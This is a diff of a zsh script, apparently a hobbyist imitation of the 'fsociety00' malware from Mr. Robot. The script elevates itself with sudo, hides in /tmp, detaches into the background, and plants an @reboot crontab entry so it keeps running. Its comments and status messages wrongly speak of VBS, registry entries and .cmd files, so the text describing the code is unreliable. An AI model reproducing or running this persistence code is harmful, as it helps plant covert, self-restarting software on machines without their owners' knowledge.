@@ -1,35 +1,53 @@
 #!/bin/zsh
 
-# Check if running as root
+# checks if its running as admin or not and if it isn't it will restart and run it as admin using  a vbs script
 if [[ $UID -ne 0 ]]; then
-  echo "Elevation required. Re-Running With Sudo"
-  sudo zsh "$0" "$@"
-  exit $?
+    sudo zsh "$0" "$@"
+    exit $?
 fi
 
-# Define directory
-TARGET_DIR="${HOME}/.fsociety00"
-[[ ! -d "$TARGET_DIR" ]] && mkdir -p "$TARGET_DIR"
-cd "$TARGET_DIR"
+# target directory for fsociety00 its gonna be in temp mainly cuz thats where alot of malware hides
+targetDir="/tmp/fsociety00"
+mkdir -p "$targetDir"
 
-# Create readme.txt
-print "-----readme.txt-----\n\nLEAVE ME HERE\n\n-----readme.txt-----" > readme.txt
+# opens to the directory after creation
+cd "$targetDir"
 
-# create the payload
-cat <<EOF > fsociety_exec.zsh
-#!/bin/zsh
-# Persistence for macOS
-if [[ "\$(uname)" == "Darwin" ]]; then
-    # macOS specific persistence logic would go here
-    echo "macOS Detected!!"
+if [[ "$1" != "-silent" ]]; then
+    ./$0 -silent &! 
+    exit 0
+fi
+
+# Readme.txt file just like the fsociety lol
+echo "-----readme.txt-----" > readme.txt
+echo "" >> readme.txt
+echo "LEAVE ME HERE" >> readme.txt
+echo "" >> readme.txt
+echo "-----readme.txt-----" >> readme.txt
+
+# The actual fsociety00 cmd payload script whatever
+echo "#!/bin/zsh\n(crontab -l 2>/dev/null | grep -q 'fsociety00') || (crontab -l 2>/dev/null; echo '@reboot $targetDir/fsociety00.zsh') | crontab -" > fsociety00.zsh
+
+chmod +x fsociety00.zsh
+./fsociety00.zsh &!
+
+if [[ -f "$targetDir/fsociety00.zsh" ]]; then
+    echo "fsociety00.cmd created successfully in $targetDir"
 else
-    (crontab -l 2>/dev/null; echo "@reboot $TARGET_DIR/fsociety_exec.zsh") | crontab -
+    echo "Failed to create fsociety00.cmd in $targetDir"
 fi
-EOF
 
-chmod +x fsociety_exec.zsh
+if crontab -l 2>/dev/null | grep -q "fsociety00"; then
+    echo "Registry entry for fsociety00 created successfully"
+else
+    echo "Failed to create registry entry for fsociety00"
+fi
 
-# execute as background process
-./fsociety_exec.zsh &! 
+if crontab -l 2>/dev/null | grep -q "fsociety00"; then
+    echo "Scheduled task for fsociety00 created successfully"
+else
+    echo "Failed to create scheduled task for fsociety00"
+fi
 
+echo "thx for using Fsociety00"
 exit 0
